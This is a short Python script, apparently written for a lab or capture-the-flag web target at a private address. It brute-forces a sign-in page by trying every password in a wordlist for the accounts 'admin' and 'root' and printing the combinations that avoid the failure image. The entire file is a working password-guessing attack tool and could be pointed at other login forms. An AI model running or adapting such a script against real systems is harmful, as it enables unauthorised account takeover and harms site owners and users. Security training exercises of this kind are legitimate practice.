import requests

if __name__ == '__main__':
    with open('./passlist.txt') as f:
        passwords = f.read().split('\n')

    try:
        for user in ['admin', 'root']:
            for password in passwords:
                params = {
                    'page': 'signin',
                    'username': user,
                    'password': password,
                    'Login': 'Login'
                }
                r = requests.get('http://10.13.0.196/index.php', params)
                if 'images/WrongAnswer.gif' not in r.text:
                    print(user, password)
    except requests.exceptions.ConnectionError as err:
        print("There was an issue. Modify the line 16 of the file to be sure it is the correct url of the website.")
    except:
        print("An error occured.")
